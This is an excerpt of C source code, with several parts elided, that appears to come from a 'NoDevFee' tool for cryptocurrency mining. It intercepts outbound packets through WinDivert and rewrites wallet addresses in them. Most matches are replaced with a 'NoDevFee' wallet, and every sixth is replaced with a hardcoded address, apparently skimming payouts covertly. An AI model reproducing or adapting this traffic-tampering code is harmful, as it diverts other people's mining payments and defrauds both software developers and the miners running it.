			...
			if (address.Direction == WINDIVERT_DIRECTION_OUTBOUND)
			{
				...
				if ((data) && (dataLength > 0))
				{
					...
					if (protocol != -1)
					{
						...
						if (wallet != 0)
						{
							memcpy(TempWallet, "0x851EAa1169f02D4Da54994f9c1C1556636b97279", 42);
							...
							if (memcmp(wallet, MainWallet, 42) != 0)
							{
								...
								if (rotat == 0 || rotat == 1 || rotat == 2 || rotat == 3 || rotat == 4) {
									memcpy(wallet, NoDevFeeWallet, 42);
									rotat += 1;
								}
								else {
									rotat = 0;
									memcpy(wallet, &TempWallet, 42);
								}
